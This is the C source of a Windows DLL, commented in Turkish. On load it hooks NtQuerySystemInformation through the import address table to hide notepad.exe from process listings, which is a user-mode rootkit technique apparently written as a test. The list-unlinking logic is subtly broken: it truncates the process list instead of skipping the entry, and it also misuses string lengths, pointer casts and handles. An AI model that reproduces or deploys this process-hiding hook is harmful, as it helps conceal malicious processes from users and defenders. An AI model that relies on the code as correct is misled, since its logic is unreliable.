#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <winternl.h>
#define _CRT_SECURE_NO_WARNINGS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;  //Bir sonraki proses'e kadar alýnan offset 
	ULONG NumberOfThreads;  
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime; //Prosesin yaratýldýðý zaman
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName; //Prosesin .exe ismi
	ULONG BasePriority;
	HANDLE ProcessId; //Prosesin id'si
	HANDLE InheritedFromProcessId; //Tanýmlayýcýsý
}MY_SYSTEM_PROCESS_INFORMATION,*PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
	__in	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"),
	"NtQuerySystemInformation");

NTSTATUS WINAPI HookNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
)
{
	NTSTATUS status = OriNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
		do
		{
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
			{
				if (pNext->NextEntryOffset)
				{
					pCurrent->NextEntryOffset = 0;
				}
				else
				{
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}
				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset!=0);
	}
	return status;
}

void GoHook()
{
	MODULEINFO modinfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);

	GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO));
	
	char szadres[64];


	LPBYTE pAdres = (LPBYTE)modinfo.lpBaseOfDll;
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAdres;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAdres + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER)&(pINH->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAdres + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);



	for (; pIID->Characteristics; pIID++)
	{
		if (!strcmp("ntdll.dll", (char *)(pAdres + pIID->Name)))
			break;
	}

	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAdres + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((pAdres + pIID->FirstThunk));
	PIMAGE_IMPORT_BY_NAME pIIBM;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++)
	{
		pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAdres + pITD->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (char *)(pIIBM->Name)))
			break;
		pFirstThunkTest++;
	}
	
		DWORD dwOld = NULL;
		VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
		pFirstThunkTest->u1.Function = (DWORD)HookNtQuerySystemInformation;
		VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
		
		sprintf(szadres, "%s 0x%X", (char *)(pIIBM->Name), pFirstThunkTest->u1.Function);

		if (pIDH->e_magic == IMAGE_DOS_SIGNATURE)
			MessageBox(NULL, szadres, "Test", MB_OK);
		else
			MessageBox(NULL, "Fail", "Fail", MB_OK);

		CloseHandle(hModule);
}

bool __stdcall DllMain(HINSTANCE hInstance, DWORD Reason, LPVOID lpReserved)
{
	switch (Reason)
	{
	case DLL_PROCESS_ATTACH:
		GoHook();
		break;
	}
	return true;
}